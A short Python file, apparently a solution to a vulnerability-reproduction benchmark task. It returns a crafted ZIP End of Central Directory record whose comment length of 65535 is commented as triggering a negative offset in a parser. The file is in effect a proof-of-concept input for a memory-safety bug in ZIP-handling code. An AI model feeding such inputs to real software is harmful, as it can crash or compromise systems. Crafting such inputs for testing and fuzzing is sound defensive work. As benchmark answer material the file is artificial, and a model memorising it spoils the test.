import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        filler = b"\x00" * 24
        eocd = (
            b"PK\x05\x06"      # End of Central Directory signature
            b"\x00\x00"        # number of this disk
            b"\x00\x00"        # disk with start of central directory
            b"\x00\x00"        # total entries on this disk
            b"\x00\x00"        # total entries
            b"\x00\x00\x00\x00"  # size of the central directory
            b"\x00\x00\x00\x00"  # offset of start of central directory
            b"\xff\xff"        # comment length = 65535 (triggers negative offset)
        )
        return filler + eocd
